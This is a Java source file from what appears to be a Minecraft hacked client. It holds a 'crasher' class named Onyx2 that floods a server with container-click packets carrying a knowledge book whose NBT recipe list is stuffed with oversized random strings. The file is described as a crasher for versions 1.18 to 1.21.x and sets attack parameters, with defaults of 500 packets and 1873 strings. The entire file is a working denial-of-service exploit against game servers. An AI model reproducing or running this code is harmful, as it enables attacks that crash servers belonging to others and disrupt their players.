package us.whitedev.crashers.impl;

import de.florianmichael.vialoadingbase.ViaLoadingBase;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.BypassHelper;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.protocol.XynisProtocol;
import us.whitedev.protocol.components.data.DataComponents;
import us.whitedev.protocol.components.data.impl.DataRecipes;
import us.whitedev.protocol.components.objects.ItemType;
import us.whitedev.protocol.packets.PacketCodec;
import us.whitedev.protocol.packets.play.PacketContainerClick;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.List;
import java.util.Optional;

public class Onyx2 implements Crasher {
    private static final String METHOD_NAME = "Onyx2";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int size = Integer.parseInt(args[3]);
        int length = Integer.parseInt(args[4]);
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);

        CompoundTag compoundTag = new CompoundTag();
        ListTag listTag = new ListTag();

        for (int i = 0; i < size; ++i)
            listTag.add(new StringTag(bypassHelper.generateString(length, BypassHelper.StringType.DEFAULT)));

        int protocol = ViaLoadingBase.getInstance().getTargetVersion().getVersion();
        if (XynisProtocol.SUPPORTED_PROTOCOLS.contains(protocol)) {
            DataRecipes dataRecipes = new DataRecipes(listTag);
            DataComponents dataComponents = new DataComponents();
            dataComponents.put(dataRecipes);

            us.whitedev.protocol.components.objects.ItemStack stack = new us.whitedev.protocol.components.objects.ItemStack(ItemType.KNOWLEDGE_BOOK.getId(protocol), 1, dataComponents);

            PacketCodec.sendPacket(new PacketContainerClick(protocol, 0, 1, 10,
                    PacketContainerClick.ContainerActionType.CLICK_ITEM, PacketContainerClick.ContainerAction.RIGHT_CLICK,
                    stack, new Int2ObjectArrayMap<>()), packets);
        }else{
            compoundTag.put("Recipes", listTag);

            ItemStack stack = new ItemStack(Items.KNOWLEDGE_BOOK, 1, Optional.of(compoundTag));

            for (int i = 0; i < packets; i++)
                PacketHelper.send(new ServerboundContainerClickPacket(0, 0, 20, 0, ClickType.PICKUP_ALL, stack, new Int2ObjectOpenHashMap<>()));

        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions(){
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER, null),
                new OptionUtil("Size", OptionType.INTEGER, null),
                new OptionUtil("Length", OptionType.INTEGER, null)
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[500], Size[1873], Length[0]";
    }


    @Override
    public String getDescription() {
        return "Basic NBT 1.18-1.21.x Crasher";
    }
}
